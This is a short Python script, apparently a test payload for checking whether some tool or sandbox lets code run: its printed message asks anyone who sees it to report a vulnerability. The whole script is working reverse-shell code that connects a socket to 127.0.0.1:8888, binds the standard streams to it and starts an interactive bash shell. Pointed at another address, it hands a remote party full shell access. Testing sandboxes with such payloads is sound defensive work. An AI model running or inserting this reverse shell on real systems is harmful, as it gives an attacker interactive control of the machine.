#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
print("You shouldn't see this message, if you see, immediately make an issue because this is a big vulnerability")
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",8888)) 
dup2(s.fileno(),0) 
dup2(s.fileno(),1) 
dup2(s.fileno(),2) 
run(["/bin/bash","-i"])